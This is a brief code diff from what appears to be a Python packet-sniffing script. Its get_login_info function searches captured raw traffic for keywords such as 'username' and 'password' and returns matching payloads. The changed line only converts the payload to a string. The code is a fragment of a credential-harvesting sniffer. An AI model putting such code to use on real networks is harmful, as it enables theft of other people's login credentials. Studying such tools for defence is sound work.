@@ -11,7 +11,7 @@ def sniff(interface):
 def get_login_info(packet):
     keywords = ["username", "user", "password", "pass", "login"]
     if packet.haslayer(Raw):
-            load = packet[Raw].load
+            load = str(packet[Raw].load)
             for key in keywords:
                 if key in load:
                     return load
